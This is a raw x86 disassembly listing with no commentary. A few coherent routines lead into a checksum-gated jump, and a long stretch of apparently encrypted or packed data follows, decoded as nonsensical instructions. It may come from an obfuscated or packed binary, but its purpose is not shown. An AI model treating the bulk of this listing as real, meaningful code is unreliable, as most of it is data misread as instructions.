  402885:	cmp    DWORD PTR ds:0x42e75e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e75e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e75e,eax
  4028a0:	mov    eax,ds:0x42e75e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e75e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	and    eax,0xe657a990
  4028e5:	add    edi,DWORD PTR [esi+0x7e]
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	leave  
  4028ed:	xor    ebp,DWORD PTR [ecx+0x0]
  4028f0:	aaa    
  4028f1:	jmp    0x4028de
  4028f3:	xor    al,BYTE PTR [edx-0x6b]
  4028f6:	mov    esp,DWORD PTR ds:0xe9ddb7d7
  4028fc:	push   edi
  4028fd:	jle    0x40295f
  4028ff:	inc    eax
  402900:	daa    
  402901:	and    eax,0x698c896a
  402906:	out    0xd4,eax
  402908:	inc    edx
  402909:	out    dx,eax
  40290a:	sbb    DWORD PTR [edi],esp
  40290c:	ins    BYTE PTR es:[edi],dx
  40290d:	pop    edx
  40290e:	iret   
  40290f:	mov    dh,0xd7
  402911:	(bad)
  402915:	dec    ebp
  402916:	push   ecx
  402917:	pushf  
  402918:	or     DWORD PTR [esi+0x3f726655],eax
  40291e:	mov    eax,DWORD PTR [ebp-0x555bdfa6]
  402924:	test   DWORD PTR [edi+edx*8+0x78393980],esp
  40292b:	lea    ebp,[edi]
  40292d:	cs xchg ecx,eax
  40292f:	(bad)
  402933:	mov    ch,dh
  402935:	call   0xf15938ea
  40293a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40293b:	pushf  
  40293c:	mov    cl,dl
  40293e:	in     eax,0xc3
  402940:	xor    DWORD PTR [ecx+0x0],edi
  402943:	add    ebx,ebx
  402945:	cmp    esp,edx
  402947:	cli    
  402948:	or     ebx,DWORD PTR [ebx-0x13]
  40294b:	mov    eax,ds:0x8239597a
  402950:	pop    esi
  402951:	and    al,0x62
  402953:	clc    
  402954:	daa    
  402955:	in     al,dx
  402956:	rcl    ebx,0x88
  402959:	cld    
  40295a:	rol    BYTE PTR [esi],cl
  40295c:	pop    esp
  40295d:	sbb    DWORD PTR [edx+0x29],eax
  402960:	cmp    DWORD PTR [edi+0x7c],ecx
  402963:	sub    DWORD PTR [edx-0x6],0x16
  402967:	ret    
  402968:	mov    ch,0x1c
  40296a:	add    ecx,DWORD PTR [edx+0x7c824b7d]
  402970:	std    
  402971:	loopne 0x4029dc
  402973:	and    BYTE PTR [esi],ch
  402975:	aaa    
  402976:	retf   0xd673
  402979:	fcomp  QWORD PTR [edx+0x3da8515e]
  40297f:	inc    esi
  402980:	ret    0xadee
  402983:	and    esp,esi
  402985:	inc    edi
  402986:	and    DWORD PTR [edx],0xffffffcc
  402989:	test   al,0x9a
  40298b:	xor    DWORD PTR [ecx-0x1dfcb4],ecx
  402991:	cmc    
  402992:	nop
  402993:	shl    DWORD PTR [ebp-0x23cc7ebc],1
  402999:	lods   eax,DWORD PTR ds:[esi]
  40299a:	xor    al,0xc
  40299c:	jmp    0x402984
  40299e:	or     ah,BYTE PTR [edx-0x14]
  4029a1:	mov    bl,0x62
  4029a3:	jmp    0xbbf6:0xd07993ec
  4029aa:	retf   
  4029ab:	rcl    DWORD PTR [esp+ebx*1],0x74
  4029af:	in     eax,0x99
  4029b1:	pop    es
  4029b2:	and    eax,0xb3cea35b
  4029b7:	out    0x51,eax
  4029b9:	add    eax,0xea101d34
  4029be:	repz mov ds:0x97473eb4,eax
  4029c4:	ss stc 
  4029c6:	inc    eax
  4029c7:	in     al,0x67
  4029c9:	xor    BYTE PTR [edx+0x42],bh
  4029cc:	pop    ebx
  4029cd:	xor    al,0xcd
  4029cf:	out    0xfa,al
  4029d1:	adc    BYTE PTR [edi-0x2e],0xf8
  4029d5:	(bad)  
  4029d6:	mov    ?,WORD PTR [esi]
  4029d8:	inc    esp
  4029d9:	popa   
  4029da:	xlat   BYTE PTR ds:[ebx]
  4029db:	icebp  
  4029dc:	repz rcr DWORD PTR [ebx],cl
  4029df:	inc    esp
  4029e0:	nop
  4029e1:	cli    
  4029e2:	xlat   BYTE PTR ds:[ebx]
  4029e3:	and    al,0x5f
  4029e5:	xchg   esi,eax
  4029e6:	lea    ebx,[ebx+0x18]
  4029e9:	inc    edi
  4029ea:	(bad)  
  4029ec:	out    0xa9,eax
  4029ee:	inc    DWORD PTR [eax+0x57]
  4029f1:	mov    esp,0x57f3f0d6
  4029f6:	aad    0x81
  4029f8:	push   ebx
  4029f9:	and    ebp,DWORD PTR [eax-0x6ce12ac1]
  4029ff:	in     eax,dx
  402a00:	xlat   BYTE PTR ds:[ebx]
  402a01:	xchg   ecx,eax
  402a02:	out    0x84,eax
  402a04:	sti    
  402a05:	adc    edx,DWORD PTR [eax+0x19de6377]
  402a0b:	fwait
  402a0c:	mov    dh,0x8d
  402a0e:	outs   dx,DWORD PTR ds:[esi]
  402a0f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  402a11:	dec    esp
  402a12:	cmc    
  402a13:	dec    edx
  402a14:	jp     0x402a82
  402a16:	and    al,0x76
  402a18:	mov    BYTE PTR [edx+0x3],0x49
  402a1c:	and    dh,BYTE PTR [ebx+eax*1+0x54]
  402a20:	int3   
  402a21:	loope  0x402a2d
  402a23:	sar    bh,1
  402a25:	or     dl,BYTE PTR [edi+ecx*4-0x5f]
  402a29:	loop   0x402a35
  402a2b:	jne    0x402a11
  402a2d:	mov    eax,ds:0x6bd48c85
  402a32:	in     al,0x4e
  402a34:	mov    dh,0x49
  402a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a37:	cli    
  402a38:	push   0x79
  402a3a:	sar    bl,cl
  402a3c:	leave  
  402a3d:	jp     0x402a86
  402a3f:	mov    ds:0x18d3ea59,eax
  402a44:	icebp  
  402a45:	cmp    cl,BYTE PTR [ecx+0x4df2ef4b]
  402a4b:	pusha  
  402a4c:	inc    esp
  402a4d:	mov    al,0x91
  402a4f:	mov    eax,0x51ef3bf1
  402a54:	push   ss
  402a55:	jno    0x402a6a
  402a57:	jbe    0x402a5e
  402a59:	and    al,0x14
  402a5b:	clc    
  402a5c:	mov    cs,WORD PTR [ebx]
  402a5e:	add    esi,DWORD PTR [edi+ecx*8-0x19]
  402a62:	enter  0xbd6a,0x83
  402a66:	cmp    DWORD PTR [esi-0x31],0x13d342b5
  402a6d:	pushf  
  402a6e:	out    0xf1,al
  402a70:	shl    DWORD PTR [ecx],1
  402a72:	and    al,0x51
  402a74:	enter  0x8dc6,0xc1
  402a78:	out    dx,al
  402a79:	or     cl,BYTE PTR [edi]
  402a7b:	cmp    eax,0x941de17a
  402a80:	sub    al,0xc6
  402a82:	test   al,0x76
  402a84:	mov    al,ds:0xda0bf01b
  402a89:	xchg   esp,eax
  402a8a:	outs   dx,DWORD PTR ds:[esi]
  402a8b:	adc    dh,BYTE PTR [edx+0x66efaf93]
  402a91:	test   al,0xeb
  402a93:	(bad)  
  402a94:	mov    al,0xe5
  402a96:	mov    al,0x95
  402a98:	and    bh,BYTE PTR [esi+0x34]
  402a9b:	push   edi
  402a9c:	scas   eax,DWORD PTR es:[edi]
  402a9d:	shl    DWORD PTR [ebx+0x76],0x15
  402aa1:	inc    ebx
  402aa2:	xor    ah,BYTE PTR [edx+0x24]
  402aa5:	xor    DWORD PTR [ebx+0x67b73181],0xffffffaf
  402aac:	test   cl,bh
  402aae:	push   edx
  402aaf:	addr16 jle 0x402b23
  402ab2:	fisttp QWORD PTR [ebp+edx*8-0x6a4c6cec]
  402ab9:	sub    ch,BYTE PTR [ecx-0x5]
  402abc:	nop
  402abd:	mov    edx,0x9a787498
  402ac2:	sbb    eax,0x9fc17b84
  402ac7:	xchg   ebp,eax
  402ac8:	xchg   DWORD PTR [ecx-0x56514f30],esp
  402ace:	jbe    0x402ab0
  402ad0:	lea    esp,[esi+0x1c]
  402ad3:	cmp    BYTE PTR [ecx-0x7f72dc5c],bh
  402ad9:	mov    ds:0xf6467c34,al
  402ade:	mov    al,0x51
  402ae0:	cmp    dh,BYTE PTR [eax+0x2b271af4]
  402ae6:	mov    al,0xf7
  402ae8:	test   BYTE PTR [esi+eax*1-0x1d],0x9e
  402aed:	cmp    DWORD PTR [ebx-0x3a],edi
  402af0:	dec    ecx
  402af1:	lods   eax,DWORD PTR ds:[esi]
  402af2:	add    bl,BYTE PTR [ebx]
  402af4:	inc    eax
  402af5:	stc    
  402af6:	loope  0x402ac7
  402af8:	pop    esi
  402af9:	ror    DWORD PTR [esp+eax*1+0x7ccf9e08],cl
  402b00:	or     eax,0xbe08fcbf
  402b05:	outs   dx,BYTE PTR ds:[esi]
  402b06:	aad    0x6c
  402b08:	adc    bh,BYTE PTR [ebx+eiz*8]
  402b0b:	mov    edi,0xcc502768
  402b10:	nop
  402b11:	inc    edx
  402b12:	outs   dx,BYTE PTR ds:[esi]
  402b13:	xchg   ebp,eax
  402b14:	bnd jb 0x402b20
  402b17:	aas    
  402b18:	cmp    ebx,DWORD PTR [eax+0x49]
  402b1b:	pusha  
  402b1c:	(bad)  
  402b1d:	and    eax,0x3ddc5f60
  402b22:	dec    ecx
  402b23:	scas   al,BYTE PTR es:[edi]
  402b24:	in     al,dx
  402b25:	mov    ds:0xb336eb76,al
  402b2a:	sub    cl,ch
  402b2c:	xchg   edx,eax
  402b2d:	es mov ah,0xba
  402b30:	aas    
  402b31:	adc    edx,DWORD PTR [ebx-0x2082e91e]
  402b37:	(bad)  
  402b38:	push   0x49
  402b3a:	xchg   edi,eax
  402b3b:	ret    0x7163
  402b3e:	pop    ds
  402b3f:	xchg   ebp,eax
  402b40:	hlt    
  402b41:	sub    edi,DWORD PTR [ecx]
  402b43:	fistp  DWORD PTR [ebp+ecx*2-0x5d76a103]
  402b4a:	dec    ecx
  402b4b:	and    BYTE PTR [esi],0x1f
  402b4e:	mov    edx,0x24a31079
  402b53:	outs   dx,BYTE PTR ds:[esi]
  402b54:	mov    ds:0xa55d0280,al
  402b59:	dec    esp
  402b5a:	cmp    DWORD PTR [ebx+0x4ebaa595],0x247d48a9
  402b64:	xchg   esp,ecx
  402b66:	idiv   BYTE PTR [ebx-0x25d37190]
  402b6c:	and    esp,ebx
  402b6e:	daa    
  402b6f:	and    eax,0x6b079fe7
  402b74:	xor    eax,0x8aa3d7f1
  402b79:	rcl    bl,0xe6
  402b7c:	das    
  402b7d:	sub    al,0x92
  402b7f:	pop    eax
  402b80:	xor    BYTE PTR [esi+0x57],ch
  402b83:	and    BYTE PTR [ebp+0x76],cl
  402b86:	or     eax,0xdc9e653b
  402b8b:	add    DWORD PTR [eiz*8-0x5c622b59],ebx
  402b92:	enter  0xc0e8,0xa3
  402b96:	jp     0x402bca
  402b98:	mov    eax,ds:0x56025321
  402b9d:	fsubr  QWORD PTR ds:0x5884954e
  402ba3:	rol    DWORD PTR [esi-0x13],cl
  402ba6:	dec    ebp
  402ba7:	fist   WORD PTR [esi+esi*8]
  402baa:	dec    esp
  402bab:	test   eax,0x5dc1746
  402bb0:	pusha  
  402bb1:	push   0x49fa2eee
  402bb6:	scas   eax,DWORD PTR es:[edi]
  402bb7:	sahf   
  402bb8:	mov    dh,0xd2
  402bba:	sub    DWORD PTR [ebx],esi
  402bbc:	fs enter 0xbb4d,0xef
  402bc1:	xor    ch,cl
  402bc3:	jmp    0x402c25
  402bc5:	push   esi
  402bc6:	mov    dl,0x23
  402bc8:	dec    ebp
  402bc9:	fwait
  402bca:	jne    0x402c3a
  402bcc:	xchg   edx,eax
  402bcd:	sti    
  402bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bcf:	mov    dh,0x14
  402bd1:	jne    0x402bcf
  402bd3:	sbb    DWORD PTR [ebx-0x1f9ccc73],ebx
  402bd9:	mov    BYTE PTR [esi+0x40],bh
  402bdc:	xchg   DWORD PTR [edi],esp
  402bde:	fldenv [eax]
  402be1:	loope  0x402c3f
  402be3:	mov    ch,0x39
  402be5:	jnp    0x402bb6
  402be7:	adc    al,BYTE PTR [esi+0x9f16895]
  402bed:	cmp    ah,BYTE PTR [edx+0x27fb1c9b]
  402bf3:	jecxz  0x402c23
  402bf5:	adc    eax,0x18e98d39
  402bfa:	and    al,BYTE PTR [ebp+0x61c87fbe]
  402c00:	xchg   ebp,eax
  402c01:	mov    al,0x14
  402c03:	jnp    0x402b8a
  402c05:	test   BYTE PTR [esp+edi*2],dh
  402c08:	mov    ?,WORD PTR [ebx]
  402c0a:	or     ch,BYTE PTR [ecx-0x80]
  402c0d:	jmp    0x7aac:0x47724487
  402c14:	addr16 dec edx
  402c16:	add    cl,bl
  402c18:	enter  0x39bd,0xae
  402c1c:	adc    ecx,DWORD PTR [esi+0x1414dfb3]
  402c22:	dec    eax
  402c23:	cmp    eax,0x12a680f2
  402c28:	and    DWORD PTR [ebp+esi*4+0x4d2b6c3e],esp
  402c2f:	je     0x402ca3
  402c31:	mov    dh,0xe2
  402c33:	es aas 
  402c35:	ret    
  402c36:	mov    edi,0x7a1272ff
  402c3b:	add    BYTE PTR ds:0xd027ecf6,al
  402c41:	lods   al,BYTE PTR ds:[esi]
  402c42:	leave  
  402c43:	in     al,0x5c
  402c45:	jb     0x402ca9
  402c47:	(bad)  
  402c48:	dec    edi
  402c49:	scas   eax,DWORD PTR es:[edi]
  402c4a:	xor    eax,0xe8780fa8
  402c4f:	or     al,0xf8
  402c51:	dec    edx
  402c52:	inc    eax
  402c53:	mov    eax,ds:0x5a922c6a
  402c58:	mov    ds,WORD PTR [ecx]
  402c5a:	fisttp WORD PTR ds:0x57f36c4
  402c60:	ins    DWORD PTR es:[edi],dx
  402c61:	xchg   edi,eax
  402c62:	in     al,dx
  402c63:	cmp    esp,esp
  402c65:	je     0x402c43
  402c67:	xor    BYTE PTR [esi+ebp*8-0x53],0xa2
  402c6c:	loope  0x402c43
  402c6e:	cld    
  402c6f:	dec    ebp
  402c70:	out    0x44,eax
  402c72:	xor    eax,DWORD PTR [ecx]
  402c74:	lahf   
  402c75:	sub    BYTE PTR [edi],bl
  402c77:	mov    bl,0xfa
  402c79:	sub    DWORD PTR [ebx],0x25
  402c7c:	gs push eax
  402c7e:	or     BYTE PTR [edx-0x7e0fba75],al
  402c84:	and    BYTE PTR [ebp-0x16ff8ae4],bl
  402c8a:	retf   0xfffb
  402c8d:	dec    DWORD PTR [ebx+0x558bf445]
  402c93:	call   0xff7deea3
  402c98:	sub    eax,0x840ffabf
  402c9d:	mov    edi,0x8b000003
  402ca2:	inc    ebp
  402ca3:	lock xor DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	inc    eax
  402cc1:	mov    edi,0x70a11d9
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	mov    bh,0x13
  402cce:	pop    edi
  402ccf:	mov    si,0xdd3d
  402cd3:	push   esi
  402cd4:	jge    0x402d3c
  402cd6:	test   eax,0xab853994
  402cdb:	lock (bad) 
  402cdd:	outs   dx,BYTE PTR ds:[esi]
  402cde:	mov    eax,0x57ca606d
  402ce3:	stos   DWORD PTR es:[edi],eax
  402ce4:	mov    BYTE PTR [esi],0xe5
  402ce7:	out    0xe3,al
  402ce9:	or     ebx,DWORD PTR [eax-0xb]
  402cec:	xlat   BYTE PTR ds:[ebx]
  402ced:	mov    BYTE PTR ds:0x3440e97c,cl
  402cf3:	arpl   WORD PTR [edi+0xb75786b],ax
  402cf9:	(bad)  
  402cfa:	ja     0x402cae
  402cfc:	aam    0x55
  402cfe:	out    0x53,eax
  402d00:	icebp  
  402d01:	int3   
  402d02:	pop    edi
  402d03:	lods   eax,DWORD PTR ds:[esi]
  402d04:	jb     0x402d2e
  402d06:	arpl   WORD PTR [ebx],bp
  402d08:	mov    WORD PTR [ecx],gs
  402d0a:	ret    0xfac
  402d0d:	xor    eax,edi
  402d0f:	or     al,0x8c
  402d11:	dec    DWORD PTR [edx]
  402d13:	loop   0x402d73
  402d15:	jbe    0x402ccf
  402d17:	hlt    
  402d18:	push   ebp
  402d19:	mov    ds:0xf709e80,al
  402d1e:	push   ebp
  402d1f:	in     al,dx
  402d20:	xchg   ecx,eax
  402d21:	cld    
  402d22:	cs sbb eax,0x5b5af6e3
  402d28:	loope  0x402d6f
  402d2a:	or     eax,0x42dfc2d3
  402d2f:	dec    esp
  402d30:	stos   BYTE PTR es:[di],al
  402d32:	add    DWORD PTR [eax+0x34],edx
  402d35:	sbb    al,0xfe
  402d37:	xor    ebx,DWORD PTR [ecx-0x64f2f8a8]
  402d3d:	push   ecx
  402d3e:	fisubr WORD PTR [esi-0x76425caa]
  402d44:	adc    DWORD PTR [ebp-0x29a7d8ad],ebx
  402d4a:	sbb    DWORD PTR [ebp+eiz*8+0x46],esi
  402d4e:	(bad)  
  402d50:	jl     0x402cef
  402d52:	dec    esi
  402d53:	into   
  402d54:	stos   BYTE PTR es:[edi],al
  402d55:	push   eax
  402d56:	dec    ebx
  402d57:	test   BYTE PTR ds:0x9e1ef266,dh
  402d5d:	aam    0x3e
  402d5f:	shl    DWORD PTR [edi],cl
  402d61:	out    0x80,eax
  402d63:	mov    BYTE PTR [eax+ebp*1-0x13],bh
  402d67:	cmp    esp,edi
  402d69:	add    ch,ch
  402d6b:	sub    al,0x24
  402d6d:	mov    bl,0xf6
  402d6f:	jmp    0x8cd8d98c
  402d74:	jp     0x402dd0
  402d76:	fld    TBYTE PTR [ebx-0x5b]
  402d79:	mov    eax,ebp
  402d7b:	imul   ecx,DWORD PTR [edi],0x5e
  402d7e:	jge    0x402d72
  402d80:	cmp    BYTE PTR [esi-0x69],al
  402d83:	sub    cl,BYTE PTR [ebp+0x3c899b38]
  402d89:	xchg   esp,eax
  402d8a:	into   
  402d8b:	mov    esi,0xcb228c05
  402d90:	mov    ecx,DWORD PTR [eax-0x77]
  402d93:	xor    eax,0xc9f33d8f
  402d98:	fld    DWORD PTR [edx]
  402d9a:	mov    al,0xfa
  402d9c:	std    
  402d9d:	inc    ecx
  402d9e:	ror    DWORD PTR [esi],cl
  402da0:	mov    ecx,0xa12ad6bc
  402da5:	pop    ecx
  402da6:	xchg   ebp,eax
  402da7:	daa    
  402da8:	mov    edx,0x8064660b
  402dad:	clc    
  402dae:	movs   WORD PTR es:[edi],WORD PTR cs:[esi]
  402db1:	fidiv  DWORD PTR [ebp-0x5b35b2e5]
  402db7:	and    dh,BYTE PTR [edx+0x13]
  402dba:	cdq    
  402dbb:	fs push esp
  402dbd:	pop    esi
  402dbe:	jmp    0x402e3f
  402dc0:	jl     0x402d6e
  402dc2:	in     eax,0x2
  402dc4:	sbb    ecx,edx
  402dc6:	cmp    eax,0xc772526f
  402dcb:	out    0x9f,eax
  402dcd:	bound  edx,QWORD PTR [esi+esi*8]
  402dd0:	mov    eax,ds:0x79786b77
  402dd5:	dec    esi
  402dd6:	mov    BYTE PTR [esi+0x12],dl
  402dd9:	push   0xa8b70cab
  402dde:	cmp    cl,BYTE PTR [edi-0x443e5a49]
  402de4:	pusha  
  402de5:	push   edi
  402de6:	je     0x402d95
  402de8:	lods   al,BYTE PTR ds:[esi]
  402de9:	fsubr  DWORD PTR [ecx-0x407c3f13]
  402def:	xor    ecx,esi
  402df1:	retf   0x263a
  402df4:	mov    ds:0xe6c0e022,al
  402df9:	ins    BYTE PTR es:[edi],dx
  402dfa:	mov    edi,0xbe50df86
  402dff:	pop    esi
  402e00:	jo     0x402dd0
  402e02:	xlat   BYTE PTR ds:[ebx]
  402e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e04:	jmp    0xff0c2fc5
  402e09:	ds loop 0x402e77
  402e0c:	ror    DWORD PTR [edi],cl
  402e0e:	mov    al,ds:0xb65b6600
  402e13:	mov    cl,0xdb
  402e15:	fwait
  402e16:	mov    bl,bh
  402e18:	push   edx
  402e19:	pop    es
  402e1a:	xor    DWORD PTR [edx+0xc],0xfffffff2
  402e1e:	popa   
  402e1f:	or     DWORD PTR [edx-0xd46356e],edi
  402e25:	mov    dh,0x68
  402e27:	rcl    ecx,0x1e
  402e2a:	jbe    0x402e59
  402e2c:	ins    DWORD PTR es:[edi],dx
  402e2d:	jecxz  0x402e80
  402e2f:	adc    al,bh
  402e31:	enter  0x4292,0xc
  402e35:	mov    ds:0x5a95705d,al
  402e3a:	mov    eax,ds:0x9f46a18a
  402e3f:	mov    ds:0xff71a1c8,eax
  402e44:	ins    BYTE PTR es:[edi],dx
  402e45:	pop    ss
  402e46:	stc    
  402e47:	test   eax,0x24789ea0
  402e4c:	or     esi,ebx
  402e4e:	sbb    eax,0xce5273c7
  402e53:	(bad)  
  402e54:	mov    bl,0x1e
  402e56:	(bad)  
  402e58:	int    0x57
  402e5a:	push   0xffffffc8
  402e5c:	sbb    esp,DWORD PTR [edx-0x3063ffd7]
  402e62:	sahf   
  402e63:	jno    0x402ec0
  402e65:	sub    BYTE PTR [ecx],dh
  402e67:	push   0xffffffb1
  402e69:	or     al,ch
  402e6b:	idiv   BYTE PTR ds:0xe4492eda
  402e71:	and    eax,0xf54dbcba
  402e76:	jno    0x402e1a
  402e78:	cmp    eax,ecx
  402e7a:	je     0x402ed4
  402e7c:	dec    edx
  402e7d:	lahf   
  402e7e:	mov    BYTE PTR [ebx-0x3e],0x5
  402e82:	rol    BYTE PTR [ecx-0x72],1
  402e85:	fiadd  DWORD PTR [esi-0x6d560cd7]
  402e8b:	shl    ecx,1
  402e8d:	inc    eax
  402e8e:	dec    ecx
  402e8f:	push   ds
  402e90:	fs sahf 
  402e92:	fwait
  402e93:	daa    
  402e94:	in     al,0x4f
  402e96:	adc    eax,0xebc8e628
  402e9b:	dec    edi
  402e9c:	and    BYTE PTR [esi],0x73
  402e9f:	sub    eax,0x6599792d
  402ea4:	rcr    DWORD PTR [edx+0xe],1
  402ea7:	xchg   edi,eax
  402ea8:	mov    ebp,DWORD PTR [ebx]
  402eaa:	xchg   BYTE PTR ds:0xf40fd0fb,cl
  402eb0:	xchg   ebp,eax
  402eb1:	sub    esi,esp
  402eb3:	pop    esp
  402eb4:	xchg   DWORD PTR gs:[ebx],edx
  402eb7:	outs   dx,DWORD PTR ds:[esi]
  402eb8:	ds mov edx,0xf8e99b75
  402ebe:	push   esi
  402ebf:	into   
  402ec0:	sub    eax,esp
  402ec2:	mov    ds:0x1cc8a6fb,al
  402ec7:	jo     0x402f04
  402ec9:	jle    0x402efd
  402ecb:	call   0xd40f25d7
  402ed0:	pop    ss
  402ed1:	xor    ecx,DWORD PTR ds:0x29e1a53c
  402ed7:	sti    
  402ed8:	into   
  402ed9:	jo     0x402f1e
  402edb:	out    dx,al
  402edc:	add    BYTE PTR [edi+0x4],bh
  402edf:	sub    eax,0x782b85ae
  402ee4:	imul   eax,DWORD PTR ds:0x94e86952,0xffffffb3
  402eeb:	mov    edi,0xf5d2abad
  402ef0:	mov    ebx,0xede64f90
  402ef5:	mov    ds:0x88a8c63f,eax
  402efa:	cmp    eax,0xfc13a2d9
  402eff:	inc    ebx
  402f00:	sub    al,BYTE PTR [edx+edi*8+0x4e3087c9]
  402f07:	dec    esi
  402f08:	pop    eax
  402f09:	pop    ebp
  402f0a:	xchg   ebx,eax
  402f0b:	dec    ecx
  402f0c:	jle    0x402eb0
  402f0e:	jmp    0xc1926ec7
  402f13:	sub    esp,DWORD PTR [edx+0x77]
  402f16:	jne    0x402eab
  402f18:	sar    BYTE PTR [edx-0x48],cl
  402f1b:	cmp    eax,DWORD PTR [esi]
  402f1d:	retf   
  402f1e:	mov    ebp,0x2d8a4e3f
  402f23:	or     esi,DWORD PTR [edx-0x15dd9ca7]
  402f29:	(bad)  
  402f2a:	sbb    DWORD PTR [edx+0x2b],0x49
  402f2e:	adc    BYTE PTR [edx],bl
  402f30:	(bad)  
  402f31:	jmp    0xb773d837
  402f36:	dec    eax
  402f37:	neg    DWORD PTR [esi]
  402f39:	pop    esi
  402f3a:	rcr    DWORD PTR [ebp-0x23549cb0],0x22
  402f41:	and    al,BYTE PTR [esi]
  402f43:	arpl   WORD PTR [ecx-0x2fc9ed2c],sp
  402f49:	(bad)  
  402f4a:	rcr    BYTE PTR [edx],1
  402f4c:	push   0xffffffb2
  402f4e:	fmul   DWORD PTR [edi-0x46]
  402f51:	dec    ebx
  402f52:	push   esi
  402f53:	retf   
  402f54:	in     eax,dx
  402f55:	loop   0x402f94
  402f57:	lea    esi,[esi+eiz*2]
  402f5a:	test   al,0x45
  402f5c:	and    ecx,DWORD PTR [edi+0xa645dd3]
  402f62:	mov    ch,BYTE PTR [ebp+0x726a0e69]
  402f68:	sti    
  402f69:	mov    es,WORD PTR [edx]
  402f6b:	sahf   
  402f6c:	in     eax,dx
  402f6d:	push   ecx
  402f6e:	xchg   esi,edx
  402f70:	xor    DWORD PTR ds:0x51bf19c9,0x78
  402f77:	mov    ds:0x3b99ed1f,eax
  402f7c:	idiv   BYTE PTR [esi]
  402f7e:	pop    ebp
  402f7f:	fild   WORD PTR [ecx+0x49]
  402f82:	imul   ebp,DWORD PTR [edi-0x34af19bd],0xffffffe8
  402f89:	sub    ah,dl
  402f8b:	dec    esp
  402f8c:	out    0xb,al
  402f8e:	stos   BYTE PTR es:[edi],al
  402f8f:	sar    DWORD PTR [edi+0x6f],1
  402f92:	adc    esi,ebp
  402f94:	sub    eax,0x442db4fe
  402f99:	and    dl,ch
  402f9b:	jae    0x402f43
  402f9d:	mov    edi,0xbad9cb35
  402fa2:	mov    ds:0xccc5666f,eax
  402fa7:	sahf   
  402fa8:	or     esp,DWORD PTR [esp+ecx*1]
  402fab:	addr16 xchg edi,eax
  402fad:	dec    ebx
  402fae:	xor    DWORD PTR [ebp-0x63696ea7],0x13
  402fb5:	inc    ecx
  402fb6:	lods   eax,DWORD PTR ds:[esi]
  402fb7:	icebp  
  402fb8:	add    al,0xe2
  402fba:	push   ecx
  402fbc:	iret   
  402fbd:	sbb    DWORD PTR [edi-0x467bb34a],0xf52ea687
  402fc7:	scas   eax,DWORD PTR es:[edi]
  402fc8:	std    
  402fc9:	std    
  402fca:	in     eax,0xfd
  402fcc:	pop    edi
  402fcd:	sub    al,0x89
  402fcf:	adc    eax,0x8bf7ec85
  402fd4:	retf   
  402fd5:	aas    
  402fd6:	mov    ebx,0x72f905da
  402fdb:	cmp    ebp,DWORD PTR [ecx-0x1a04a897]
  402fe1:	popf   
  402fe2:	inc    ebx
  402fe3:	test   al,0x4
  402fe5:	in     al,0x7d
  402fe7:	mov    fs,WORD PTR [ebx+ebx*2]
  402fea:	cli    
  402feb:	inc    edi
  402fec:	xchg   edx,ebx
  402fee:	cmp    dl,BYTE PTR [edx+0x21]
  402ff1:	jae    0x40300b
  402ff3:	mov    esp,0x74bb4951
  402ff8:	je     0x402fd6
  402ffa:	out    0x61,al
  402ffc:	xchg   edi,eax
  402ffd:	cmp    eax,DWORD PTR [edi-0x26b91088]
  403003:	add    al,0x7b
  403005:	pop    edi
  403006:	adc    bh,BYTE PTR [ebx-0x40]
  403009:	popa   
  40300a:	rcl    DWORD PTR [ebp+0x5c],0xb8
  40300e:	neg    BYTE PTR [ecx-0x7a]
  403011:	arpl   WORD PTR [ebp+0x50b2cabe],dx
  403017:	ds inc bx
  40301a:	lea    esi,[esi-0x58]
  40301d:	xchg   ecx,eax
  40301e:	aaa    
  40301f:	cmp    edx,ecx
  403021:	sbb    al,0x76
  403023:	mov    ds:0x6b1b171c,eax
  403028:	lock lock push edx
  40302b:	test   al,0x61
  40302d:	lahf   
  40302e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40302f:	sbb    al,0xe2
  403031:	dec    edx
  403032:	sub    ebp,DWORD PTR [esi+0x2e]
  403035:	xor    eax,0x246ea10e
  40303a:	scas   eax,DWORD PTR es:[edi]
  40303b:	jle    0x40305c
  40303d:	and    eax,0x9fa566f9
  403042:	sti    
  403043:	add    DWORD PTR [esi],0xb03aedcd
  403049:	aaa    
  40304a:	call   0x644d:0x20c12f90
  403051:	dec    edi
  403052:	mov    edi,0xe546bafc
  403057:	mov    dh,0x10
  403059:	jb     0x403028
  40305b:	scas   al,BYTE PTR es:[edi]
  40305c:	in     al,0x91
  40305e:	(bad)  [edi+0x66]
  403061:	mov    eax,DWORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fcomi  st,st(7)
  403076:	xchg   ecx,eax
  403077:	fwait
  403078:	nop
  403079:	sahf   
